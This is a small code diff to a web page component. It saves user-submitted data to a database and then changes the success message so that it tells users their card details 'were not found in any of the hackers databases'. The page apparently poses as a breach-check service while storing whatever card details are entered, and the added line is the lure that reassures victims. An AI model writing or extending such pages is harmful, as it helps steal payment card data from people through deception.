@@ -30,7 +30,7 @@ export default function Home() {
 
         try {
             await addDoc(ref, data);
-            await Swal.fire('Success', 'No data found..!', 'success');
+            await Swal.fire('Success', 'These card details were not found in any of the hackers databases..!', 'success');
             window.location.reload();
         } catch (error) {
             console.log(error);
